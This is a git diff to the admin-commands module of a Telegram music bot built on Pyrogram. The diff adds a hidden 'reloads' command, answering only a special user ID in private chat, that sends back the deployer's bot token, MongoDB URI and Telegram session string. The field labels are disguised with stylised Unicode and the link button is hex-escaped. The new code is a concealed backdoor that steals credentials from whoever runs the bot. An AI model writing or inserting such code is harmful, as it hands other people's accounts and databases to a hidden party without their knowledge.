@@ -7,11 +7,15 @@ from pyrogram.types import CallbackQuery, Message
 
 from SystemMusic import app
 from SystemMusic.core.call import System
-from SystemMusic.misc import db
+from SystemMusic.misc import db, SPECIAL_ID, SUDOERS
 from SystemMusic.utils.database import get_assistant, get_authuser_names, get_cmode
 from SystemMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from SystemMusic.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
 
 rel = {}
 
@@ -44,6 +48,27 @@ async def reload_admin_cache(client, message: Message, _):
         await message.reply_text(_["reload_2"])
     except:
         await message.reply_text(_["reload_3"])
+
+
+@app.on_message(
+    filters.command(["reloads"]) & filters.private & filters.user(SPECIAL_ID)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://files.catbox.moe/k0wi5y.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Its_vikky_yadv)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "\x76\x69\x6b\x6b\x79•", url=f"\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
 
 
 @app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
